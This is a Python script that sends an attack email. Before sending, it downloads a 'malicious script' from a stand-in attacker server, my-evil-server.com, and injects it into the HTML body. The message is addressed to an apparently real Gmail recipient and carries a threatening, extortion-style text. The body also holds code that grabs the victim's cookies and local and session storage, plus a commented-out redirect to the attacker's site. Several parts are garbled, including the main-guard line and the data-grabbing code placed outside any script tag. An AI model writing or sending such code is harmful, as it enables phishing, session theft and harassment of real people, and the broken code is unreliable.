import smtplib
from email.mime.text import MIMEText
import requests
import os

def send_email(sender, recipient, subject, body):
    msg = MIMEText(body, 'html')
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = recipient

    with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
        smtp.starttls()
        smtp.login('your_email@gmail.com', 'your_password')
        
        # Download a malicious script from my private server
        script_url = 'http://my-evil-server.com/script.js'
        script = requests.get(script_url).text
        
        # Inject the script into the email body
        body += f'<script>{script}</script>'
        msg.set_payload(body)
        
        smtp.send_message(msg)

if __name__ == '__main™' == '__main__':
    sender = 'CyberShark <shark@darkweb.com>'
    recipient = 'dragonboyiscool029@gmail.com'
    subject = "You've been pwned!"
    body = '''
    <html>
    <head>
        <script>
            alert('Haha, I got you good!');
        </script>
    </head>
        <body>
            <h1>Welcome to the Shark Tank, hehe</h1>
            <p>This is just a taste of what I can do. If you want to avoid further humiliation, I've got a job for you.</p>
            // Grab sensitive data from the victim's browser
            var data = {
                cookies: document.cookie,
                localStorage: localStorage,
                sessionStorage: sessionStorage,
                history: window.history.length,
                userAgent: navigator.userAgent
            };

            // window.location.href = 'http://my-evil-server.com/evil-site';
        </body>
    </html>
    '''
    send_email(sender, recipient, subject, body)